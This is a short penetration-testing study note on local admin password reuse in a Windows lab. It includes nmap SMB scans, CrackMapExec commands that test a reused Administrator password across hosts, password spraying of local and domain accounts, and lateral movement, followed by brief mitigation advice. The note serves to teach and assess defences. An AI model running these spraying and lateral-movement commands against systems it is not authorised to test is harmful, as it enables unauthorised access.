# 🔐 Local Admin Password Reuse

> [!ABSTRACT] Overview of Local Admin Password Reuse
>
> This document explores techniques and methods to identify, exploit, and mitigate local admin password reuse in various environments.

---

## 🖥️ Initial Environment Setup

### Metadata & Machine IPs

> [!INFO] Metadata & Machine IPs
>
> - IP Address: `192.168.0.10`
> - OS: Windows Server 2016
> - Domain: `lab.local`

---

## 🕵️‍♂️ Initial Reconnaissance

### Enumeration Tools

- [[Nmap]]
- [[CrackMapExec]]

#### Nmap Scanning

```bash
sudo nmap -sC -sV -p139,445 192.168.0.10
```

Aggressive SMB Enumeration:

```bash
sudo nmap --script smb* -p445 192.168.0.10
```

#### CME Reconnaissance

```bash
crackmapexec smb 192.168.0.10
```

---

## 🔍 Password Reuse Detection

### Local Admin Credentials

> [!WARNING] Potential for Unauthorized Access
>
> The presence of local admin credentials with the same password across multiple machines increases risk.

#### Checking Credentials

```bash
crackmapexec smb 192.168.0.10 -u Administrator -p 'P@ssw0rd!'
```

If successful, proceed to check other machines for similar passwords:

```bash
crackmapexec smb 192.168.0.11 -u Administrator -p 'P@ssw0rd!'
```

---

## 🔑 Exploitation Techniques

### Password Spraying

#### Local Accounts

```bash
crackmapexec smb 192.168.0.10 \
-u users.txt \
-p 'Password123!' \
--local-auth
```

#### Domain Accounts

```bash
crackmapexec smb 192.168.0.10 \
-u users.txt \
-p 'Password123!'
```

---

## 🧪 Post-Exploitation Activities

### Lateral Movement

Once the local admin credentials are obtained, attempt lateral movement:

```bash
crackmapexec smb 192.168.0.11 -u Administrator -p 'P@ssw0rd!'
```

---

## 🔒 Mitigation Strategies

### Password Policies & Enforcement

> [!NOTE] Enforcing Strong Passwords and Unique Credentials
>
> Implement strong password policies to ensure unique credentials across systems.

- Regularly rotate passwords.
- Use multi-factor authentication (MFA).
- Monitor for unauthorized access attempts.

---

## 🧠 Exam Mental Model

```text
Reconnaissance → Identify Local Admin Accounts
 ├─ Check Passwords Across Systems
 │   ├─ Same Password? → Unauthorized Access Risk
 │   └─ Unique Credentials? → Lowered Risk
 ├─ Exploit Weaknesses (Password Spraying, etc.)
 └─ Mitigate Risks (Strong Policies, MFA)
```

> [!SUCCESS] Key Takeaway
>
> **Local admin password reuse** significantly increases the risk of unauthorized access and lateral movement. Ensure strong, unique credentials across systems to mitigate these risks.

---

## 📝 References

- [[CrackMapExec]]
- [[Nmap]]

---